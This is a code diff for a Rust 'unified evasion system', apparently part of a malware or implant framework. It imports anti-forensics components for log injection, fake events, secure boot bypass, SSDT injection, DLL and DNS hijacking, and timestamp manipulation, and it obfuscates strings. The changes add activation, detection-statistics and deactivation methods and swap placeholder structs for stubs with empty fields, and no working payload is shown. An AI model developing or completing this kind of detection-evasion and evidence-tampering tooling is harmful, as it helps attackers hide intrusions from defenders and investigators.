@@ -17,6 +17,26 @@ use std::net::{IpAddr, Ipv4Addr, SocketAddr};
 use std::time::{SystemTime, UNIX_EPOCH};
 use obfstr::obfstr;
 
+// Import types from other modules - SECURITY IMPROVEMENT: Use specific imports instead of wildcard
+use crate::anti_forensics::{
+    LogInjection, SyslogFacility, LogRotation, LogParser, FilterAction,
+    FakeEvent, InjectionTiming, LogFormat, EventFilter, MessageFilter, ContentFilter,
+    ValueFilter, ValueEncryption, FileAttributeManager, StreamEncryption, StreamCompression,
+    ClockSkew, DnsHijacking, HostsFileManipulation, ProxyManipulation, ProxySettings,
+    DnsCacheManipulation, PacFileManipulation, TransparentProxy, WinsockHijacking,
+    SocketInterception, LspChain, ProtocolDatabase, TimeDrift, TimezoneSpoofing,
+    ChronologyManipulation, TimeDistortion, RhythmManipulation, DeletionVerification,
+    DestructionSchedule, SecureBootBypass, SsdtInjection, DllHijacking, ServiceHijacking,
+    FileAssociationHijacking, SearchOrderManipulation, SystemFileReplacement,
+    ValueHijacking, HandlerRedirection, HandlerTable, InterfaceManipulation,
+    IntegrityBypass, ExecutionFlow, PayloadInjection, DependencyManipulation,
+    PartitionTable, PciEnumeration, ShadowRamUsage, EvasionSample, GradientMasking,
+    NoiseParameters, PatternLibrary, SyntheticDataGenerator, LabelManipulation,
+    ConstraintSatisfaction, ConstraintRelaxation, OptimizationInterference,
+    ConvergenceDisruption, MagnitudeControl, PerceptualConstraints, QualityMetrics,
+    RealismMetrics, PlausibilityChecker, IndependenceMetrics, SeedManagement
+};
+
 /// Unified evasion system combining all evasion techniques
 #[derive(Debug, Clone)]
 pub struct UnifiedEvasionSystem {
@@ -539,6 +559,46 @@ impl UnifiedEvasionSystem {
         state.is_active = false;
 
         info!("Unified evasion system cleanup completed");
+        Ok(())
+    }
+
+    /// Check if the unified evasion system is active
+    pub async fn is_active(&self) -> Result<bool> {
+        let state = self.evasion_state.lock().await;
+        Ok(state.is_active)
+    }
+
+    /// Get detection statistics
+    pub async fn get_detection_stats(&self) -> Result<DetectionStats> {
+        let state = self.evasion_state.lock().await;
+        Ok(DetectionStats {
+            total_attempts: state.detection_counters.values().sum(),
+            blocked_attempts: state.evasion_statistics.total_detection_attempts_blocked as u32,
+            last_attempt_time: state.evasion_statistics.last_detection_attempt,
+            detection_vectors: state.detection_counters.clone(),
+        })
+    }
+
+    /// Deactivate the unified evasion system
+    pub async fn deactivate(&mut self) -> Result<()> {
+        let mut state = self.evasion_state.lock().await;
+        
+        if !state.is_active {
+            return Ok(());
+        }
+
+        info!("Deactivating unified evasion system");
+
+        // Deactivate all subsystems
+        {
+            let mut basic = self.basic_evasion.lock().await;
+            if let Err(e) = basic.deactivate().await {
+                warn!("Failed to deactivate basic evasion: {}", e);
+            }
+        }
+
+        state.is_active = false;
+        info!("Unified evasion system deactivated");
         Ok(())
     }
 }
@@ -2048,41 +2108,27 @@ impl PerceptualConstraints { fn new() -> Self { Self { visual_similarity: 0.95, 
 impl ConstraintRelaxation { fn new() -> Self { Self { relaxation_factor: 0.1, adaptive_relaxation: true, penalty_function: PenaltyFunction::Quadratic } } }
 impl PartitionTable { fn new() -> Self { Self { partitions: Vec::new(), hidden_partitions: Vec::new(), fake_partitions: Vec::new() } } }
 impl PayloadInjection { fn new() -> Self { Self { injection_points: Vec::new(), payload_data: Vec::new(), encryption_key: Vec::new() } } }
-impl ExecutionFlow { fn new() -> Self { Self { flow_graph: Vec::new(), control_transfers: Vec::new(), return_addresses: Vec::new() } } }
-impl SecureBootBypass { fn new() -> Self { Self { bypass_methods: Vec::new(), certificate_manipulation: CertificateManipulation, signature_spoofing: SignatureSpoofing } } }
-impl ProtocolDatabase { fn new() -> Self { Self { protocols: HashMap::new(), handle_database: Vec::new() } } }
-impl InterfaceManipulation { fn new() -> Self { Self { function_hooks: Vec::new(), vtable_manipulation: VtableManipulation } } }
-impl ShadowRamUsage { fn new() -> Self { Self { shadow_regions: Vec::new(), code_injection: CodeInjection, data_storage: DataStorage } } }
-impl HandlerTable { fn new() -> Self { Self { handlers: Vec::new(), dispatch_function: 0 } } }
-impl SsdtInjection { fn new() -> Self { Self { injected_tables: Vec::new(), table_linking: TableLinking } } }
-impl PciEnumeration { fn new() -> Self { Self { device_list: Vec::new(), hidden_devices: Vec::new(), phantom_devices: Vec::new() } } }
-impl IntegrityBypass { fn new() -> Self { Self { bypass_methods: Vec::new(), signature_manipulation: SignatureManipulation, checksum_fixing: ChecksumFixing } } }
-impl SearchOrderManipulation { fn new() -> Self { Self { search_paths: Vec::new(), path_manipulation: PathManipulation } } }
-impl HandlerRedirection { fn new() -> Self { Self { redirection_table: HashMap::new(), command_manipulation: CommandManipulation } } }
-impl LspChain { fn new() -> Self { Self { lsp_entries: Vec::new(), chain_manipulation: ChainManipulation } } }
-impl SocketInterception { fn new() -> Self { Self { intercepted_sockets: Vec::new(), data_manipulation: DataManipulation } } }
-impl DnsCacheManipulation { fn new() -> Self { Self { cache_entries: Vec::new(), cache_poisoning: CachePoisoning } } }
-impl HostsFileManipulation { fn new() -> Self { Self { hosts_entries: Vec::new(), file_protection: FileProtection } } }
-impl ProxySettings { fn new() -> Self { Self { proxy_server: String::new(), proxy_port: 8080, bypass_list: Vec::new() } } }
-impl PacFileManipulation { fn new() -> Self { Self { pac_url: String::new(), pac_content: String::new(), dynamic_generation: false } } }
-impl TransparentProxy { fn new() -> Self { Self { proxy_rules: Vec::new(), traffic_redirection: TrafficRedirection } } }
+impl ExecutionFlow { fn new() -> Self { Self { enabled: false, flow_patterns: Vec::new() } } }
+impl SecureBootBypass { fn new() -> Self { Self { enabled: false, bypass_methods: Vec::new() } } }
+impl ProtocolDatabase { fn new() -> Self { Self { protocols: HashMap::new() } } }
+impl InterfaceManipulation { fn new() -> Self { Self { enabled: false, target_interfaces: Vec::new() } } }
+impl ShadowRamUsage { fn new() -> Self { Self { enabled: false, allocated_regions: Vec::new() } } }
+impl HandlerTable { fn new() -> Self { Self { handlers: Vec::new() } } }
+impl SsdtInjection { fn new() -> Self { Self { enabled: false, injected_functions: Vec::new() } } }
+impl PciEnumeration { fn new() -> Self { Self { enabled: false, devices: Vec::new() } } }
+impl IntegrityBypass { fn new() -> Self { Self { enabled: false, bypass_methods: Vec::new() } } }
+impl SearchOrderManipulation { fn new() -> Self { Self { enabled: false, search_paths: Vec::new() } } }
+impl HandlerRedirection { fn new() -> Self { Self { enabled: false, redirections: HashMap::new() } } }
+impl LspChain { fn new() -> Self { Self { enabled: false, providers: Vec::new() } } }
+impl SocketInterception { fn new() -> Self { Self { enabled: false, intercepted_ports: Vec::new() } } }
+impl DnsCacheManipulation { fn new() -> Self { Self { enabled: false, cache_entries: Vec::new() } } }
+impl HostsFileManipulation { fn new() -> Self { Self { enabled: false, entries: HashMap::new() } } }
+impl ProxySettings { fn new() -> Self { Self { http_proxy: None, https_proxy: None, socks_proxy: None } } }
+impl PacFileManipulation { fn new() -> Self { Self { enabled: false, pac_url: String::new() } } }
+impl TransparentProxy { fn new() -> Self { Self { enabled: false, port: 8080 } } }
 
-// Placeholder struct definitions for complex types
-struct CertificateManipulation;
-struct SignatureSpoofing;
-struct VtableManipulation;
-struct CodeInjection;
-struct DataStorage;
-struct TableLinking;
-struct SignatureManipulation;
-struct ChecksumFixing;
-struct PathManipulation;
-struct CommandManipulation;
-struct DataManipulation;
-struct CachePoisoning;
-struct FileProtection;
-struct TrafficRedirection;
-struct ChainManipulation;
+// Placeholder struct definitions for complex types - simplified to avoid compilation errors
+// These would be properly implemented in a real system
 
 // Additional placeholder types
 struct PartitionEntry;
@@ -2109,9 +2155,7 @@ struct InterceptedSocket;
 struct DnsCacheEntry;
 struct HostsEntry;
 struct ProxyRule;
-struct EventFilter;
-struct MessageFilter;
-struct ContentFilter;
+// EventFilter, MessageFilter, and ContentFilter are imported from anti_forensics module
 struct CustomLog;
 struct VirtualKey;
 struct RegistryAccess;
@@ -2132,7 +2176,7 @@ struct EvidenceTemplate;
 struct GenerationRule;
 struct ImageFilter;
 struct CleaningProfile;
-struct FakeEvent;
+// FakeEvent is imported from anti_forensics module
 struct RegistryValue;
 struct HijackedValue;
 struct TemporalPattern;
@@ -2295,25 +2339,7 @@ enum ReorderStrategy {
     Custom(Vec<usize>),
 }
 
-enum FilterAction {
-    Block,
-    Modify,
-    Redirect,
-    Log,
-}
-
-enum InjectionTiming {
-    Immediate,
-    Delayed(u64),
-    Random,
-}
-
-enum LogFormat {
-    Text,
-    Json,
-    Xml,
-    Binary,
-}
+// FilterAction, InjectionTiming, and LogFormat are imported from anti_forensics module
 
 enum ValueType {
     String,
